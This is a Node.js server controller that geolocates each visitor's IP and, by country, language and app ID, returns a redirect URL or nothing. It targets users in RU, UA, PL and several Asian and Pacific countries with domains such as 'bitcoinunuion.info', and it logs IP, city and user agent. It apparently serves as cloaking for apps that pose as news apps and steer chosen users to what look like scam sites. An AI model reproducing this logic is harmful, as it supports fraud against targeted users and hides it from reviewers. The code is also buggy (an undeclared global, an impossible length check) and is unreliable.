const geoip = require('geoip-lite');
const ip6addr = require('ip6addr');
const Address6 = require('ip-address').Address6;
const Ip = require('../models/IpAddress');
const User = require('../models/User');
const errorHandler = require('../utils/errorHandler');

module.exports.getUrl = async function (req, res) {
    try {
        let ip = req.ip
        // let ip = '185.41.250.246'
        if (ip6addr.parse(ip).kind() === 'ipv6') {
            ip = new Address6(ip).inspectTeredo().server4;
        }

        if (ip.substr(0, 7) === "::ffff:") {
            ip = ip.substr(7)
        }

        let data = checkCountry(ip, req.body.language, req.body.app);

        let unique;
        const uniqueUser = await User.findOne({ip})
        if (uniqueUser) {
            unique = 0
        } else {
            unique = 1
        }

        let date = new Date(Date.now()).getFullYear() + '-' +
            ("0" + (new Date(Date.now()).getMonth() + 1)).slice(-2) + '-' +
            ("0" + (new Date(Date.now()).getDate())).slice(-2) + ' ' +
            ("0" + new Date(Date.now()).getHours()).slice(-2) + ':' +
            ("0" + new Date(Date.now()).getMinutes()).slice(-2) + ':' +
            ("0" + new Date(Date.now()).getSeconds()).slice(-2);

        let utmStatus = '';

        let reason = null
            if (data.url === null) {
                if (data.reason.length < 0) {
                    reason = 'Invalid country'
                } else {
                    reason = data.reason
                }
                res.status(200).json({status: false})
            } else {
                if (req.body.UTM) {
                    if (url === 'magexemizer.pl' && !Number.isInteger(+req.body.app)) url = url + '/?' + req.body.UTM

                    if (req.body.UTM.toLowerCase().includes('defaultutm')) {
                        utmStatus = 0
                    } else {
                        utmStatus = 1
                        let allUrl = getFullUrl(data.url, req.body.UTM)
                        url = allUrl.newUrl
                        data.url = allUrl.newUrl
                    }
                }
                res.status(200).json({
                    status: true,
                    url
                })
            }
            const user = new User({
                UserAgent: req.body.UserAgent,
                UTM: req.body.UTM,
                reason: reason,
                language: req.body.language.toUpperCase(),
                url: data.url,
                responseUrl: url,
                ip,
                country: data.countryCode,
                city: data.city,
                bot: 0,
                unique,
                date: date,
                app: req.body.app || '',
                utm_status: utmStatus
            });

        await user.save()

    } catch (e) {
        errorHandler(res, e)
    }
}

function checkCountry(ip, language, app) {
    let geo = geoip.lookup(ip);
    let countryCode;
    let city;
    let reason = '';
    if (geo === null) {
        url = null;
        countryCode = null;
        city = null;
    } else {
        countryCode = geo.country;
        city = geo.city;

        if (countryCode === "CN" ||
            countryCode === "SG" || countryCode === "AU" ||
            countryCode === "UK" || countryCode === "HK") {
            url = 'bitcoinunuion.info'
        } else if (countryCode === 'RU' || countryCode === "UA" || countryCode === "PL") {
            if (language.toUpperCase().includes('RU') ||
                language.toUpperCase().includes('UA') ||
                language.toUpperCase().includes('PL')) {
                if (app === 'com.appside.polishnewsapp') {
                    url = 'pulsbihzdnmnesu.info'
                }
                else if (app === 'info.app') {
                    url = 'cotytqdzien.info'
                }
                else if (app === '1534116643') {
                    // url = 'cotytdzyien.info'
                    url = null
                }
                else {
                    url = 'magexemizer.pl'
                }

            } else {
                reason = 'Invalid language'
                url = null
            }
        } else {
            url = null;
            reason = 'Invalid country'
        }
    }

    return {url, countryCode, city, reason}
}

function getFullUrl(url, utm) {
      if (utm === 'defaultUTM') {
          return {newUrl: url}
      } else {
          let arr = utm.split('=')
          return {newUrl: url + '/?' + `sub1=${arr[0]}&sub2=${arr[1]}&sub3=${arr[2]}&sub4=${arr[3]}`}
      }
}